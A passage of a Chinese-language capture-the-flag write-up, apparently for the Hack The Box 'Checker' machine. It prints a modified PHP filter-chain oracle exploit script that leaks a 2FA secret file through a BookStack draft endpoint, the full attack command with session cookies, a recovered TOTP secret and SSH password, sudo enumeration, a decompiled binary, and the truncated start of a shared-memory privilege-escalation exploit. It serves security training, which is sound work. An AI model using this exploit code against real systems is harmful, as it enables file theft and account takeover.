\u003cspan class=\"hljs-string\"\u003e\"{\\\"X-CSRF-TOKEN\\\": \\\"\u003cspan class=\"hljs-variable\"\u003e$CSRF\u003c/span\u003e-TOKEN\\\", \\\"Content-Type\\\": \\\"application/x-www-form-urlencoded\\\", \\\"Cookie\\\": \\\"jstree_select=1; XSRF-TOKEN=\u003cspan class=\"hljs-variable\"\u003e$XSRF\u003c/span\u003e-TOKEN; bookstack_session=\u003cspan class=\"hljs-variable\"\u003e$BookStack\u003c/span\u003e\\\"}\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们新建书本添加新页面后点击保存的包即可获得上面所需所有参数\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用工具前需要替换新的\u003ccode\u003ephp_filter_chains_oracle_exploit/filters_chain_oracle/core/requestor.py\u003c/code\u003e文件，不然很容易出现错误\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// new requestor.py\nimport json\nimport requests\nimport \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\nimport \u003cspan class=\"hljs-built_in\"\u003ebase64\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# Ensure base64 module is imported\u003c/span\u003e\nfrom filters_chain_oracle.core.verb import Verb\nfrom filters_chain_oracle.core.utils import merge_dicts\nimport re\n\n\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\nClass Requestor, defines all the request logic.\n\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\nclass Requestor:\n    def __init__(self, file_to_leak, target, parameter, data=\u003cspan class=\"hljs-string\"\u003e\"{}\"\u003c/span\u003e, headers=\u003cspan class=\"hljs-string\"\u003e\"{}\"\u003c/span\u003e, verb=Verb.POST, in_chain=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e, proxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):\n        self.file_to_leak = file_to_leak\n        self.target = target\n        self.parameter = parameter\n        self.headers = headers\n        self.verb = verb\n        self.json_input = json_input\n        self.match = match\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] The following URL is targeted : {}\"\u003c/span\u003e.format(self.target))\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] The following local file is leaked : {}\"\u003c/span\u003e.format(self.file_to_leak))\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] Running {} requests\"\u003c/span\u003e.format(self.verb.name))\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e data != \u003cspan class=\"hljs-string\"\u003e\"{}\"\u003c/span\u003e:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] Additionnal data used : {}\"\u003c/span\u003e.format(data))\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e headers != \u003cspan class=\"hljs-string\"\u003e\"{}\"\u003c/span\u003e:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] Additionnal headers used : {}\"\u003c/span\u003e.format(headers))\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e in_chain != \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] The following chain will be in each request : {}\"\u003c/span\u003e.format(in_chain))\n            in_chain = \u003cspan class=\"hljs-string\"\u003e\"|convert.iconv.{}\"\u003c/span\u003e.format(in_chain)\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e match:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] The following pattern will be matched for the oracle : {}\"\u003c/span\u003e.format(match))\n        self.in_chain = in_chain\n        self.data = json.loads(data)\n        self.headers = json.loads(headers)\n        self.delay = \u003cspan class=\"hljs-built_in\"\u003efloat\u003c/span\u003e(delay)\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e proxy :\n            self.proxies = {\n                \u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e: f\u003cspan class=\"hljs-string\"\u003e'{proxy}'\u003c/span\u003e,\n                \u003cspan class=\"hljs-string\"\u003e'https'\u003c/span\u003e: f\u003cspan class=\"hljs-string\"\u003e'{proxy}'\u003c/span\u003e,\n            }\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n            self.proxies = None\n        self.instantiate_session()\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e time_based_attack:\n            self.time_based_attack = self.error_handling_duration()\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[+] Error handling duration : {}\"\u003c/span\u003e.format(self.time_based_attack))\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n            self.time_based_attack = False\n        \n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    Instantiates a requests session for optimization\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    def instantiate_session(self):\n        self.session = requests.Session()\n        self.session.headers.update(self.headers)\n        self.session.proxies = self.proxies\n        self.session.verify = False\n\n    def \u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(self, *x):\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'|'\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(x)\n\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    Used to see how much time a 500 error takes to calibrate the timing attack\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    def error_handling_duration(self):\n        chain = \u003cspan class=\"hljs-string\"\u003e\"convert.base64-encode\"\u003c/span\u003e\n        requ = self.req_with_response(chain)\n        self.normal_response_time = requ.elapsed.total_seconds()\n        self.blow_up_utf32 = \u003cspan class=\"hljs-string\"\u003e'convert.iconv.L1.UCS-4'\u003c/span\u003e\n        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)\n        chain_triggering_error = f\u003cspan class=\"hljs-string\"\u003e\"convert.base64-encode|{self.blow_up_inf}\"\u003c/span\u003e\n        requ = self.req_with_response(chain_triggering_error)\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ.elapsed.total_seconds() - self.normal_response_time\n\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    Used to parse the option parameter sent by the user\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    def parse_parameter(self, filter_chain):\n        data = {}\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'['\u003c/span\u003e and \u003cspan class=\"hljs-string\"\u003e']'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e self.parameter: \u003cspan class=\"hljs-comment\"\u003e# Parse array elements\u003c/span\u003e\n            \n            main_parameter = [re.search(r\u003cspan class=\"hljs-string\"\u003e'^(.*?)\\['\u003c/span\u003e, self.parameter).group(1)]\n            sub_parameters = re.findall(r\u003cspan class=\"hljs-string\"\u003e'\\[(.*?)\\]'\u003c/span\u003e, self.parameter)\n            all_params = main_parameter + sub_parameters\n            json_object = {}\n            temp = json_object\n            \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i, element \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e enumerate(all_params):\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e i == len(all_params) -1:\n                    temp[element] = filter_chain\n                \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n                    temp[element] = {}\n                    temp = temp[element]\n            data = json_object\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n            data[self.parameter] = filter_chain\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e merge_dicts(data, self.data)\n\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    Returns the response of a request defined with all options\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    def req_with_response(self, s):\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.delay \u003e 0:\n            time.sleep(self.delay)\n\n        filter_chain = f\u003cspan class=\"hljs-string\"\u003e'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e# DEBUG print(filter_chain)\u003c/span\u003e\n        merged_data = self.parse_parameter(filter_chain)\n\n        \u003cspan class=\"hljs-comment\"\u003e# Fix indentation: Encode filter chain in Base64\u003c/span\u003e\n        encoded_bytes = base64.b64encode(filter_chain.encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e))\n        encoded_str = encoded_bytes.decode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e)\n        payload = f\u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;img src='data:image/png;base64,{encoded_str}'/\u003e\"\u003c/span\u003e\n        merged_data[self.parameter] = payload  \u003cspan class=\"hljs-comment\"\u003e# Fixed indentation\u003c/span\u003e\n\n        \u003cspan class=\"hljs-comment\"\u003e# Make the request, the verb and data encoding is defined\u003c/span\u003e\n        try:\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.verb == Verb.GET:\n                requ = self.session.get(self.target, params=merged_data)\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ\n            \u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e self.verb == Verb.PUT:\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.json_input: \n                    requ = self.session.put(self.target, json=merged_data)\n                \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n                    requ = self.session.put(self.target, data=merged_data)\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ\n            \u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e self.verb == Verb.DELETE:\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.json_input:\n                    requ = self.session.delete(self.target, json=merged_data)\n                \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n                    requ = self.session.delete(self.target, data=merged_data)\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ\n            \u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e self.verb == Verb.POST:\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.json_input:\n                    requ = self.session.post(self.target, json=merged_data)\n                \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n                    requ = self.session.post(self.target, data=merged_data)\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ\n        except requests.exceptions.ConnectionError :\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[-] Could not instantiate a connection\"\u003c/span\u003e)\n            \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(1)\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e None\n\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    Used to determine if the answer trigged the error based oracle\n    TODO : increase the efficiency of the time based oracle\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    def error_oracle(self, s):\n        requ = self.req_with_response(s)\n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.match:\n            \u003cspan class=\"hljs-comment\"\u003e# DEBUG print(\"PATT\", (self.match in requ.text))\u003c/span\u003e\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e self.match \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e requ.text \n\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.time_based_attack:\n            \u003cspan class=\"hljs-comment\"\u003e# DEBUG print(\"ELAP\", requ.elapsed.total_seconds() \u003e ((self.time_based_attack/2)+0.01))\u003c/span\u003e\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ.elapsed.total_seconds() \u003e ((self.time_based_attack/\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e)+\u003cspan class=\"hljs-number\"\u003e0.01\u003c/span\u003e)\n        \n        # DEBUG print(\"CODE\", requ.status_code == \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e)\n        return requ.status_code == \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython filters_chain_oracle_exploit.py \\\n  --target \u003cspan class=\"hljs-string\"\u003e\"http://checker.htb/ajax/page/12/save-draft\"\u003c/span\u003e \\\n  --file \u003cspan class=\"hljs-string\"\u003e\"/backup/home_backup/home/reader/.google_authenticator\"\u003c/span\u003e \\\n  --parameter \u003cspan class=\"hljs-string\"\u003e\"html\"\u003c/span\u003e \\\n  --verb PUT \\\n  --headers \u003cspan class=\"hljs-string\"\u003e\"{\\\"X-CSRF-TOKEN\\\": \\\"W2b1WrEWyjBm6Trtww9aTPmoS9ZBqZejPACNmTT5\\\", \\\"Content-Type\\\": \\\"application/x-www-form-urlencoded\\\", \\\"Cookie\\\": \\\"jstree_select=1; XSRF-TOKEN=eyJpdiI6InRMa3VVTzZTa2EzWDVFRFQzaEFlSkE9PSIsInZhbHVlIjoiUFFvT2IxeDR2U3FKMndxenlmRmwwTWYyUlJNbXVscnRrUGFtZkdzM2hjKzlsU1U0ZjdOUkVRMkI2U1FKYmpqMFNDTnVHdVNFYzR1TXhDN1A5dFdlUHVBK05UZUhweWtyMHRKUVFHbVZUd05Lays5VklZS3JtbjByNWJqVEk0QTAiLCJtYWMiOiI1Y2Y5OWMwNGRkOTVlODQ4ZjI0YWYxNDBlMWM0MmM4MmE1YjdkYWI1YmY0NzUzMmVlNWRhZjI2MDZlYWI5ZWQwIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6Ild0Um4wek9DVzlZYU55WEZpZUFqK0E9PSIsInZhbHVlIjoiQlFYMXZic1NQUXBtVG1IRXFvb1R3dkFsTTJyQW5meUZuUi9QbUd0Lzdtb2RXS2VGOUpFQUhHVXFmRGlBRW9iNG1SUEttTVlYZzF6NzJiVGxicFp5L09qVUdGQmp4UEFqaUFTZWt5VkZpS0I3UE1URHcrNkZML2FlUy9JQW82cXIiLCJtYWMiOiJiMTBmMWQzNzVjNTYwNDMyYWFlMTU1YzNlNTRmYzJhYjk0NTllMDUzODgxYTRjY2RhMmJmNzVkMzJmMDUxZDhkIiwidGFnIjoiIn0%3D\\\"}\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image24.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最终读出来是：\u003ccode\u003eDVDBRAODLCWF7I2ONA4K5LQLUE\u003c/code\u003e ，并使用\u003ca href=\"https://it-tools.tech/otp-generator\"\u003ehttps://it-tools.tech/otp-generator\u003c/a\u003e 来获取验证码\u003c/p\u003e\n\u003cp\u003e登录\u003ccode\u003eSSH\u003c/code\u003e，得使用美国或者欧洲节点，不然会出现 \u003ccode\u003eError \"Operation Not Permitted\"\u003c/code\u003e 是时间同步问题，但是通过\u003ccode\u003edate --set \"$(curl -is 10.10.11.56 | grep Date | awk -F 'Date:' '{print $2}')\"\u003c/code\u003e 也无法登录成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/checker/php_filter_chains_oracle_exploit  ssh reader@checker.htb\n(reader@checker.htb) Password: // hiccup-publicly-genesis\n(reader@checker.htb) Verification code: // code\nWelcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e not \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e into.\n\nTo restore this content, you can run the \u003cspan class=\"hljs-string\"\u003e'unminimize'\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ecommand\u003c/span\u003e.\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nLast login: Tue Feb 25 15:23:52 2025 from 10.10.16.57\nreader@checker:~$ \n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取\u003ccode\u003e.google_authenticator\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ereader@checker:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e .google_authenticator \nDVDBRAODLCWF7I2ONA4K5LQLUE\n\u003cspan class=\"hljs-string\"\u003e\" TOTP_AUTH\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取用户\u003ccode\u003eUserFlag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ereader@checker:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \n13a819d80cf8119xxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e信息收集\u003c/h2\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ereader@checker:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e reader on checker:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n/2\nUser reader may run the following commands on checker:\n    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ereader@checker:/opt/hash-checker$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 68\ndrwxr-xr-x 2 root root  4096 Jan 30 17:09 .\ndrwxr-xr-x 5 root root  4096 Jan 30 17:04 ..\n-r-------- 1 root root   118 Jan 30 17:07 .\u003cspan class=\"hljs-built_in\"\u003eenv\u003c/span\u003e\n-rwxr--r-- 1 root root   141 Jan 30 17:04 check-leak.sh\n-rwxr--r-- 1 root root 42376 Jan 30 17:02 check_leak\n-rwx------ 1 root root   750 Jan 30 17:07 cleanup.sh\n-rw-r--r-- 1 root root  1464 Jan 30 17:09 leaked_hashes.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003echeck-leak.sh\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ereader@checker:/opt/hash-checker$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e check-leak.sh \n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e `\u003cspan class=\"hljs-built_in\"\u003edirname\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$0\u003c/span\u003e`/.env\nUSER_NAME=$(/usr/bin/echo \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e\"\u003c/span\u003e | /usr/bin/tr -dc \u003cspan class=\"hljs-string\"\u003e'[:alnum:]'\u003c/span\u003e)\n/opt/hash-checker/check_leak \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$USER_NAME\u003c/span\u003e\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将\u003ccode\u003echeck_leak\u003c/code\u003e拉出来分析\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  const char *v3; // rdx\n  unsigned int v5; // [rsp+14h] [rbp-3Ch]\n  char *v6; // [rsp+18h] [rbp-38h]\n  char *v7; // [rsp+20h] [rbp-30h]\n  char *v8; // [rsp+28h] [rbp-28h]\n  char *v9; // [rsp+30h] [rbp-20h]\n  char *s; // [rsp+40h] [rbp-10h]\n  void *ptr; // [rsp+48h] [rbp-8h]\n\n  v6 = getenv(\u003cspan class=\"hljs-string\"\u003e\"DB_HOST\"\u003c/span\u003e);\n  v7 = getenv(\u003cspan class=\"hljs-string\"\u003e\"DB_USER\"\u003c/span\u003e);\n  v8 = getenv(\u003cspan class=\"hljs-string\"\u003e\"DB_PASSWORD\"\u003c/span\u003e);\n  v9 = getenv(\u003cspan class=\"hljs-string\"\u003e\"DB_NAME\"\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( *(_BYTE *)(((unsigned __int64)(argv + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e) \u003e\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex7FFF8000) )\n    __asan_report_load8(argv + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n  s = (char *)argv[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e];\n  if ( !v6 || !v7 || !v8 || !v9 )\n  {\n    if ( *(_BYTE *)(((unsigned __int64)\u0026#x26;stderr \u003e\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex7FFF8000) )\n      __asan_report_load8(\u0026#x26;stderr);\n    fwrite(\"Error: Missing database credentials in environment\\n\", \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003euLL, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex33uLL, stderr);\n    __asan_handle_no_return();\n    exit(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n  }\n  if ( argc != \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e )\n  {\n    if ( *(_BYTE *)(((unsigned __int64)argv \u003e\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex7FFF8000) )\n      __asan_report_load8(argv);\n    v3 = *argv;\n    if ( *(_BYTE *)(((unsigned __int64)\u0026#x26;stderr \u003e\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex7FFF8000) )\n      __asan_report_load8(\u0026#x26;stderr);\n    fprintf(stderr, \"Usage: %s \u0026#x3C;USER\u003e\\n\", v3);\n    __asan_handle_no_return();\n    exit(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n  }\n  if ( !s )\n    goto LABEL_40;\n  if ( *(_BYTE *)(((unsigned __int64)s \u003e\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex7FFF8000) != \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n    \u0026#x26;\u0026#x26; ((unsigned __int8)s \u0026#x26; \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e) \u003e= *(_BYTE *)(((unsigned __int64)s \u003e\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex7FFF8000) )\n  {\n    __asan_report_load1(s);\n  }\n  if ( !*s )\n  {\nLABEL_40:\n    if ( *(_BYTE *)(((unsigned __int64)\u0026#x26;stderr \u003e\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex7FFF8000) )\n      __asan_report_load8(\u0026#x26;stderr);\n    fwrite(\"Error: \u0026#x3C;USER\u003e is not provided.\\n\", \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003euLL, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex1FuLL, stderr);\n    __asan_handle_no_return();\n    exit(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n  }\n  if ( strlen(s) \u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex14 )\n  {\n    if ( *(_BYTE *)(((unsigned __int64)\u0026#x26;stderr \u003e\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex7FFF8000) )\n      __asan_report_load8(\u0026#x26;stderr);\n    fwrite(\"Error: \u0026#x3C;USER\u003e is too long. Maximum length is \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e characters.\\n\", \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003euLL, \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex3CuLL, stderr);\n    __asan_handle_no_return();\n    exit(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n  }\n  ptr = (void *)fetch_hash_from_db(v6, v7, v8, v9, s);\n  if ( ptr )\n  {\n    if ( (unsigned __int8)check_bcrypt_in_file(\"/opt/hash-checker/leaked_hashes.txt\", ptr) )\n    {\n      puts(\"Password is leaked!\");\n      if ( *(_BYTE *)(((unsigned __int64)\u0026#x26;edata \u003e\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex7FFF8000) )\n        __asan_report_load8(\u0026#x26;edata);\n      fflush(edata);\n      v5 = write_to_shm(ptr);\n      printf(\"Using the shared memory \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex%X as temp location\\n\", v5);\n      if ( *(_BYTE *)(((unsigned __int64)\u0026#x26;edata \u003e\u003e \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) + \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ex7FFF8000) )\n        __asan_report_load8(\u0026#x26;edata);\n      fflush(edata);\n      sleep(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003eu);\n      notify_user(v6, v7, v8, v9, v5);\n      clear_shared_memory(v5);\n    }\n    else\n    {\n      puts(\"User is safe.\");\n    }\n    free(ptr);\n  }\n  else\n  {\n    puts(\"User not found in the database.\");\n  }\n  return \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eexp（佬提供：\u003ccode\u003eTelegram : @PAINNNN_21\u003c/code\u003e \u003ccode\u003eDiscord ID : pain._.05\u003c/code\u003e）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;stdio.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;stdlib.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;sys/ipc.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;sys/shm.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;time.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;errno.h\u003e\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#include \u0026#x3C;string.h\u003e\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e#define SHM_SIZE 0x400   // 1024 bytes\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#define SHM_MODE 0x3B6   // Permissions: 0666 in octal\u003c/span\u003e\n\nint main(void) {\n    // Seed the random number generator with the current \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e.\n    time_t 